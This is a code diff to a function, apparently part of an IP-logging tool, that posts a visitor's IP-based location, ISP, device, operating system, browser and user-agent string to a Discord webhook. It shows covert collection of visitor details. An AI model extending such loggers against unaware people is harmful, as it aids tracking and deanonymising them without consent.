@@ -45,6 +45,11 @@ def send_ip_to_discord(ip, data, user_agent_raw, method):
         "fields": [
             {"name": "Approximate Location", "value": f"{data['location']['city']}, {data['location']['region']}, {data['location']['country']} {data['flag']['emoji']}", "inline": False},
             {"name": "Service Provider", "value": f"ISP: {data['company']['name']}\n"f"Domain: {data['company']['domain']}", "inline": False},
+            {"name": "Request Method", "value": method, "inline": True},
+            {"name": "Device Type", "value": device_type, "inline": True},
+            {"name": "Operating System", "value": os_info, "inline": True},
+            {"name": "Browser", "value": browser_info, "inline": True},
+            {"name": "User Agent String", "value": user_agent_raw or "Unknown", "inline": False},
             {"name": "Timestamp", "value": current_time.strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
         ]
     }
